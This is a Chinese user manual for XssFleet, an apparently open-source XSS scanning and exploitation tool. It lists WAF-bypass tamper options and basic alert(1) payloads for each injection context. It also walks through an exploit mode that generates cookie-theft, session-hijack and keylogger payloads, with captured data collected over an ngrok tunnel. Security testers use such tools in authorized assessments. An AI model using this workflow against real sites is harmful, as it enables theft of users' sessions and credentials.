# XssFleet 使用手册

## 目录

1. [简介](#简介)
2. [功能特性](#功能特性)
3. [安装配置](#安装配置)
4. [快速开始](#快速开始)
5. [基本命令](#基本命令)
6. [高级选项](#高级选项)
7. [漏洞利用模式](#漏洞利用模式)
8. [输出报告](#输出报告)
9. [使用示例](#使用示例)
10. [常见问题](#常见问题)

***

## 简介

XssFleet 是一款专业的 XSS（跨站脚本）漏洞自动化渗透测试工具。它能够自动检测、验证和利用目标网站中的 XSS 漏洞，并提供完整的漏洞利用框架，支持 Cookie 窃取、会话劫持等高级攻击场景。

### 目标定位

- **漏洞检测**：自动扫描 Web 应用中的 XSS 漏洞
- **漏洞验证**：通过浏览器自动化验证漏洞真实性
- **漏洞利用**：集成多种 XSS 攻击载荷，支持 ngrok 穿透
- **报告生成**：输出详细的漏洞报告

***

## 功能特性

### 核心功能

| 功能            | 说明                            |
| ------------- | ----------------------------- |
| 反射型 XSS 检测    | 自动检测 URL 参数中的反射型 XSS          |
| 存储型 XSS 检测    | 检测数据库/文件存储型 XSS               |
| DOM-based XSS | 分析 JavaScript 代码中的 DOM 操作     |
| HTTP 头检测      | 检测 Referer、User-Agent 等头的 XSS |
| WAF 绕过        | 集成多种绕过 WAF 的混淆技术              |
| 深度扫描          | 启用更多检测规则和 Payload             |

### 漏洞利用功能

| 功能        | 说明           |
| --------- | ------------ |
| Cookie 窃取 | 窃取受害者 Cookie |
| 会话劫持      | 窃取完整会话信息     |
| 键盘记录器     | 记录用户键盘输入     |
| 页面篡改      | 修改页面内容       |
| 重定向攻击     | 重定向用户到恶意网站   |
| ngrok 集成  | 自动建立公网隧道     |

### 上下文识别

| 上下文类型      | 说明                    |
| ---------- | --------------------- |
| HTML 标签    | Payload 直接注入到 HTML 标签 |
| HTML 属性    | Payload 注入到 HTML 属性中  |
| JavaScript | Payload 注入到 JS 代码     |
| DOM-based  | 通过 DOM 操作执行           |
| URL 参数     | Payload 作为 URL 参数值    |

***

## 安装配置

### 系统要求

- Python 3.8+
- Windows / Linux / macOS
- Chrome/Firefox 浏览器（用于漏洞验证）

### 安装步骤

1. **克隆项目**

```bash
git clone https://github.com/jhli07/XssFleet.git
cd xssfleet
```

1. **安装依赖**

```bash
pip install -r requirements.txt
```

1. **安装 ngrok（可选，用于漏洞利用）**

```bash
# 下载 ngrok: https://ngrok.com/download
# 注册账号并获取 authtoken
ngrok config add-authtoken YOUR_TOKEN
```

### 依赖列表

```
requests>=2.28.0
beautifulsoup4>=4.11.0
colorama>=0.4.6
selenium>=4.0.0
flask>=2.0.0
urllib3>=1.26.0
```

***

## 快速开始

### 扫描单个 URL

```bash
python xssfleet/xssfleet.py -u "http://target.com/search?q=test"
```

### 深度扫描

```bash
python xssfleet/xssfleet.py -u "http://target.com/page" --deep
```

### 批量扫描

```bash
python xssfleet/xssfleet.py -m urls.txt --deep
```

***

## 基本命令

### 常用参数

| 参数                | 说明      | 示例                       |
| ----------------- | ------- | ------------------------ |
| `-u, --url`       | 目标 URL  | `-u "http://target.com"` |
| `-m, --batch`     | 批量扫描文件  | `-m urls.txt`            |
| `-p, --parameter` | 指定测试参数  | `-p q`                   |
| `-d, --deep`      | 深度扫描模式  | `--deep`                 |
| `-o, --output`    | 报告输出目录  | `-o results/`            |
| `--verify`        | 浏览器验证漏洞 | `--verify`               |
| `--browser`       | 显示浏览器窗口 | `--browser`              |

### HTTP 方法

```bash
# GET 请求
python xssfleet/xssfleet.py -u "http://target.com/search?q=test"

# POST 请求
python xssfleet/xssfleet.py -u "http://target.com/login" --method POST --data "user=admin&pass=test"
```

### 自定义请求头

```bash
python xssfleet/xssfleet.py -u "http://target.com/api" --headers "Content-Type:application/json;Authorization:Bearer token123"
```

### Cookie 设置

```bash
python xssfleet/xssfleet.py -u "http://target.com/page" --cookie "PHPSESSID=abc123;user=admin"
```

***

## 高级选项

### WAF 绕过

启用混淆脚本绕过 WAF：

```bash
python xssfleet/xssfleet.py -u "http://target.com" --tamper=space2comment,base64encode
```

### 绕过技术列表

| 技术              | 说明            |
| --------------- | ------------- |
| `space2comment` | 空格替换为 `/**/`  |
| `base64encode`  | 参数值 Base64 编码 |
| `htmlencode`    | HTML 实体编码     |
| `unicodeescape` | Unicode 转义    |
| `urlencode`     | URL 编码        |

### 深度扫描模式

深度扫描包含额外的检测：

- DOM-based XSS 检测
- 更多 Payload 变体
- 盲注 XSS 检测

```bash
python xssfleet/xssfleet.py -u "http://target.com" --deep
```

### HTTP Header 扫描

检测 Referer、User-Agent 等 Header 中的 XSS：

```bash
python xssfleet/xssfleet.py -u "http://target.com" --headers-scan
```

### 超时设置

```bash
python xssfleet/xssfleet.py -u "http://target.com" --timeout 60
```

### 详细输出

```bash
# 普通输出
python xssfleet/xssfleet.py -u "http://target.com"

# 详细输出 (-v)
python xssfleet/xssfleet.py -u "http://target.com" -v

# 更详细 (-vv)
python xssfleet/xssfleet.py -u "http://target.com" -vv

# 最详细 (-vvv)
python xssfleet/xssfleet.py -u "http://target.com" -vvv
```

***

## 漏洞利用模式

### 启动利用模式

```bash
python xssfleet/xssfleet.py --exploit
```

### 法律声明

工具会显示法律合规提示，必须输入 `y` 确认已获得授权才能继续：

```
============================================================
        XSS Exploitation Feature - Legal Disclaimer
============================================================

[!] Important Notice:

This tool is for authorized security testing only!

1. You must obtain explicit written authorization from the target website owner
2. Do not use for any unauthorized testing activities
3. Comply with all applicable laws and regulations
4. Only use in authorized testing environments

Unauthorized access or attacks may be illegal!

Please ensure your testing is legal and compliant.

============================================================

Have you obtained explicit authorization from the target website owner? (y/N): y
```

### 选择攻击载荷

可用的攻击载荷类型：

| 载荷类型            | 说明        | 适用场景                   |
| --------------- | --------- | ---------------------- |
| `steal_cookie`  | Cookie 窃取 | reflected, stored, dom |
| `steal_session` | 会话劫持      | reflected, stored, dom |
| `keylogger`     | 键盘记录器     | stored                 |
| `deface`        | 页面篡改      | stored, reflected      |
| `redirect`      | 页面重定向     | reflected, stored, dom |
| `alert_test`    | 弹窗测试      | reflected, stored, dom |

### 选择漏洞上下文

根据检测到的漏洞类型选择合适的上下文：

| 上下文          | 说明                 |
| ------------ | ------------------ |
| `html`       | HTML 标签上下文         |
| `attribute`  | HTML 属性上下文（需要闭合标签） |
| `javascript` | JavaScript 代码上下文   |
| `dom_based`  | DOM 操作上下文          |
| `url_param`  | URL 参数上下文          |
| `auto`       | 自动生成多种备选 Payload   |

### 交互操作

启动后会显示以下选项：

```
Select action:
  1 - Show captured data
  2 - Generate new payloads
  3 - Stop exploitation

Enter your choice:
```

1. **显示捕获数据** - 查看已窃取的 Cookie、会话等信息
2. **生成新载荷** - 切换不同上下文生成新 Payload
3. **停止利用** - 关闭 ngrok 和监听服务器

### 完整演示

```bash
# 1. 启动利用模式
python xssfleet/xssfleet.py --exploit

# 2. 确认授权
Have you obtained explicit authorization? (y/N): y

# 3. 选择载荷类型
Select payload type: steal_cookie

# 4. 选择上下文（不知道用 auto）
Select vulnerability context: auto

# 5. 获取生成的 Payload 和 ngrok URL

# 6. 将 Payload 注入目标漏洞点

# 7. 等待目标访问，选择 1 查看捕获的数据
```

***

## 输出报告

### 报告格式

| 格式     | 说明        |
| ------ | --------- |
| `json` | JSON 格式报告 |
| `html` | HTML 格式报告 |
| `all`  | 同时生成两种格式  |

### 生成报告

```bash
# 输出到指定目录
python xssfleet/xssfleet.py -u "http://target.com" -o results/

# 指定格式
python xssfleet/xssfleet.py -u "http://target.com" --report-format json

# 生成所有格式
python xssfleet/xssfleet.py -u "http://target.com" --report-format all
```

### 报告内容

报告包含：

- 扫描目标信息
- 发现的漏洞列表
- 每个漏洞的详细信息（类型、参数、Payload、风险等级）
- 验证建议
- 利用建议

***

## 使用示例

### 示例 1：基础扫描

```bash
python xssfleet/xssfleet.py -u "http://example.com/search?q=test"
```

输出：

```
[*] Testing parameter: q
[*] Running XSS detection...
[+] Found 3 potential vulnerabilities!
```

### 示例 2：深度扫描 + 浏览器验证

```bash
python xssfleet/xssfleet.py -u "http://example.com/page" --deep --verify
```

### 示例 3：批量扫描

创建 `urls.txt`：

```
http://example.com/page1?q=test
http://example.com/page2?name=test
http://example.com/search?id=123
```

运行：

```bash
python xssfleet/xssfleet.py -m urls.txt --deep -o scan_results/
```

### 示例 4：WAF 绕过扫描

```bash
python xssfleet/xssfleet.py -u "http://waf-protected.com/search" --tamper=space2comment,base64encode
```

### 示例 5：测试 POST 请求

```bash
python xssfleet/xssfleet.py -u "http://example.com/login" --method POST --data "username=test&password=123"
```

### 示例 6：Cookie 窃取攻击

```bash
# 1. 先扫描发现漏洞
python xssfleet/xssfleet.py -u "http://vulnerable.com/search?q=test"

# 2. 启动利用模式
python xssfleet/xssfleet.py --exploit

# 3. 选择 steal_cookie 和 auto

# 4. 将生成的 Payload 注入漏洞点

# 5. 等待目标访问后查看捕获的 Cookie
```

### 示例 7：测试隐藏参数

```bash
python xssfleet/xssfleet.py -u "http://example.com/page" -p t_sort
```

### 示例 8：完整渗透测试流程

```bash
# 阶段 1：发现漏洞
python xssfleet/xssfleet.py -u "http://target.com" --deep --verify -o phase1/

# 阶段 2：漏洞利用
python xssfleet/xssfleet.py --exploit

# 阶段 3：生成报告
python xssfleet/xssfleet.py -u "http://target.com" --report-format all -o final_report/
```

***

## 常见问题

### Q1: 如何判断漏洞是否真实存在？

使用 `--verify` 参数通过浏览器自动化验证：

```bash
python xssfleet/xssfleet.py -u "http://target.com" --verify
```

### Q2: 扫描很慢怎么办？

1. 减少 Payload 数量（不使用 `--deep`）
2. 减少超时时间
3. 批量扫描时增加并发（未来版本支持）

### Q3: 被 WAF 拦截怎么办？

使用混淆脚本：

```bash
python xssfleet/xssfleet.py -u "http://target.com" --tamper=space2comment,base64encode
```

### Q4: 如何测试特定参数？

```bash
python xssfleet/xssfleet.py -u "http://target.com/page?id=1&name=test" -p name
```

### Q5: ngrok 连接失败？

1. 确认 ngrok 已安装并配置 authtoken
2. 检查网络连接
3. 确认端口 8080 未被占用

### Q6: 报告在哪里？

默认在当前目录，可通过 `-o` 指定：

```bash
python xssfleet/xssfleet.py -u "http://target.com" -o ./results/
```

### Q7: 如何查看所有可用选项？

```bash
python xssfleet/xssfleet.py --help
```

### Q8: 支持哪些漏洞类型？

- 反射型 XSS
- 存储型 XSS
- DOM-based XSS
- 盲注 XSS
- SVG XSS
- JSONP XSS
- AngularJS XSS

***

## 漏洞上下文详解

### HTML 标签上下文

**特点**：用户输入直接成为 HTML 标签

**示例**：

```html
<div>用户输入</div>
```

**攻击 Payload**：

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

### HTML 属性上下文

**特点**：用户输入成为 HTML 属性值，需要闭合标签

**示例**：

```html
<input value="用户输入">
```

**攻击 Payload**：

```html
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
```

### JavaScript 上下文

**特点**：用户输入成为 JavaScript 代码

**示例**：

```javascript
<script>var name = "用户输入";</script>
```

**攻击 Payload**：

```javascript
";alert(1);"
';alert(1);'
```

### DOM-based 上下文

**特点**：通过 JavaScript 的 DOM 操作插入内容

**示例**：

```javascript
document.write(location.hash)
```

**攻击 Payload**：

```
#<img src=x onerror=alert(1)>
```

***

## 免责声明

XssFleet 仅供授权的安全测试和研究使用。使用本工具即表示您同意：

1. 仅在已获得明确书面授权的目标上使用
2. 遵守所有适用的法律法规
3. 承担使用本工具的所有责任
4. 不将本工具用于任何非法目的

作者和贡献者不对因滥用本工具造成的任何损失负责。

***

## 联系方式

- GitHub:<https://github.com/jhli07/XssFleet>
- Issues: <https://github.com/jhli07/XssFleet/issues>

***

**版本：v1.0.0**
